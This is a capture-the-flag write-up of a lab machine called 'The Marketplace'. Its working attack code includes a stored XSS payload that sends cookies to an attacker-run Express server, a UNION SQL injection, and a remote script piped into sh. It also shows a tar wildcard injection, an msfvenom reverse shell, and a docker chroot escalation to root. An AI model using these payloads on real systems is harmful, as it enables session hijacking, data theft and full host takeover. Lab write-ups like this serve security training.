# The Marketplace

Lets start with some recon `nmap -A -sS -T4 <IP>`

Rsults:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 13:06 EST
Nmap scan report for 10.10.215.43
Host is up (0.033s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
|_http-server-header: nginx/1.19.2
32768/tcp open  http    Node.js (Express middleware)
|_http-title: The Marketplace
| http-robots.txt: 1 disallowed entry 
|_/admin
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Linux 2.6.32 - 3.1 (86%), Linux 2.6.39 - 3.2 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   32.96 ms 10.11.0.1
2   33.09 ms 10.10.215.43

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.45 seconds
```

So as we can see we have a simple structure of an ssh login on port 22 and an http webserver on port 80 that is mirrored for nodejs on port 32768. So lets head over to the website! While looking over the website I will run gobuster in the back to find hidden directories.

Okay so we can signup lets do that first thing that catches my eye is the new listing featurenwe can probably upload a revshell there. (Also gobuster returned nothing intresting.) After trying to upload an image I see they have blocked that by putting a No image placeholder:

![Screen1](https://github.com/Gomez0015/CTF-Writeups/blob/main/📄%20CTF%20Writeups/Images/Screen%20Shot%202022-03-08%20at%207.01.31%20PM.png)

So lets just try an XSS attack! With a simple `<script>alert('Hello!')</script>` in the description it works! we get a succesful alert. So lets take it to the next level and check if anyone (like an admin) is checking our post!

Lets start with making a simple server which can accept post request and log the data to our console! I will be making a node.js server for this because its what I prefer but there are many ways to do it. 

Start with a simple `npm init` then we can make a `server.js` file and add some simple code:

```js
const express = require('express')
const app = express()
const port = 3000
var bodyParser = require('body-parser')

// parse application/x-www-form-urlencoded
app.use(bodyParser.urlencoded({ extended: false }))

// parse application/json
app.use(bodyParser.json())

app.use(function(req, res, next) {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
  next();
});

app.post('/cookies', (req, res) => {
  console.log(req.body);
})

app.listen(port, () => {
  console.log(`Malicious app listening on port ${port}`)
})
```

then just run `npm i express body-parser` and were good to go!

![Screen2](https://github.com/Gomez0015/CTF-Writeups/blob/main/📄%20CTF%20Writeups/Images/Screen%20Shot%202022-03-08%20at%205.49.37%20PM.png)

Now back to the website if we change our script tu send post data to `YOURIP/cookies` we should get it logged directly! Easy right? We can use the following code as a test in our console to make sure we get the data.

```js
var xhr = new XMLHttpRequest();
xhr.open("POST", 'http://<YOURIP>:<PORT>/cookies', true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
    value: 'value'
}));
```

Which should in result give us a simple `{ value: 'value' }` logged to our console! Well congrats we got the server working and ready to steal data! Now lets iinject this into a ticket! 

So as we had before `<script>alert('XSS')</script>` And just replace whats inside the script with what we just tested!

```html
</textarea>
	<script>
		var xhr = new XMLHttpRequest();
		xhr.open("POST", 'http://<YOURIP>:<PORT>/cookies', true);
		xhr.setRequestHeader('Content-Type', 'application/json');
		xhr.send(JSON.stringify({
			value: 'value'
		}));
	</script>
```

It works! Perfect now all we have to do is find important data like cookies and send them over by changing the body to:
`cookies: document.cookie`

Also make sure to report the post to the admins so one actually goes check it out!
After doing that we get:
```json
{
  cookies: 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NDY3NjMzNTF9.tG4DQ-jnozS-E3h69kXPOSlwPwAbqeskQZq0DkfseJo'
}
```

Cookies! Yay! We can now use firefox dev tools or just a chrome cookie editor extension and change our token to the admins!

![Screen3](https://github.com/Gomez0015/CTF-Writeups/blob/main/📄%20CTF%20Writeups/Images/Screen%20Shot%202022-03-08%20at%207.23.09%20PM.png)

We now have access to the admins panel + our first flag GG! Lets keep going!
If we click on a user we can see this kind of url: `http://10.10.215.43/admin?user=4`
Which I think indicates it runs an SQL query based on users id so we can SQLi that. Lets try it.

Lets Imagine the query goes as such: 
`SELECT * FROM users WHERE id=(user input)`

So what if we tried inserting in the url the following SQL query:
`6 UNION SELECT @@version,1,1,1;---`
 We get a positive result! 
 
![Screen4](https://github.com/Gomez0015/CTF-Writeups/blob/main/📄%20CTF%20Writeups/Images/Screen%20Shot%202022-03-08%20at%2010.26.04%20PM.png)
 
So now lets run sqlmap on it:
`sqlmap http://<IP>/admin?user=3 --cookie='token=<TOKEN>' --technique=U --delay=2 -dump`

This will give us some juicy info

![Screen5](https://github.com/Gomez0015/CTF-Writeups/blob/main/📄%20CTF%20Writeups/Images/Screen%20Shot%202022-03-08%20at%2011.08.44%20PM.png)
 
Here we have the users table with some hashed passwords. We also get an intresting message:
`Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_ENXkGYUCAv3zJ`

and it was to `user_id 3` which means thats jake! Lets try logging into
`ssh jake@ip`

![Screen5](https://github.com/Gomez0015/CTF-Writeups/blob/main/📄%20CTF%20Writeups/Images/Screen%20Shot%202022-03-08%20at%2011.12.54%20PM.png)

Sick! Were in baby!! We can now just `cat user.txt` and get the second flag!
Time for the best part Priv Esc. I will run a simple [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) 

First we can host a server on our Attack Machine: 
`python -m SimpleHTTPServer 80`
Then on our Victim Machine:
`curl <YOUR_IP>/linpeas.sh | sh`

After running linPEAS we have some intresting info:

```
(michael) NOPASSWD: /opt/backups/backup.sh
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```

Contents of `/opt/backups/backup.sh`:
```bash
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

So we see that we can run the file wthout a password which is good and the file is using * a wildcard character which we can exploit! First in our Attacker Machine we need to create a payload using: `msfvenom -p cmd/unix/reverse_netcat lhost=<YOUR_IP> lport=9999 R`
After we get the payload back we can now inject it into a file on the victim machine using these following commands:
```bash
echo '<YOUR_PAYLOAD>' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

now if we open a `nc -nvlp 9999` on our machine and try to run: `sudo -u michael /opt/backups/backup.sh` we get an error about backup.tar permissions for michael so lets just `mv backup.tar bk.tar` and now if we run it again we get a reverse shell for michael!

![Screen6](https://github.com/Gomez0015/CTF-Writeups/blob/main/📄%20CTF%20Writeups/Images/Screen Shot 2022-03-09 at 11.27.51 AM.png)

Lets just run a quick `python -c 'import pty; pty.spawn("/bin/sh")'` to get a better shell. So as we saw earlier in linPEAS michael is  docker user so we can exploit that with a quick [GTFOBins](https://gtfobins.github.io/gtfobins/docker/) search! If we just scroll down to ==sudo== we can find the following payload:
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Which if we just run, and then check who we are with `whoami`, we are now root!
GG! Was a fun one some SQLi, XSS, Wildcard PrivEsc and Docker. See ya next time!

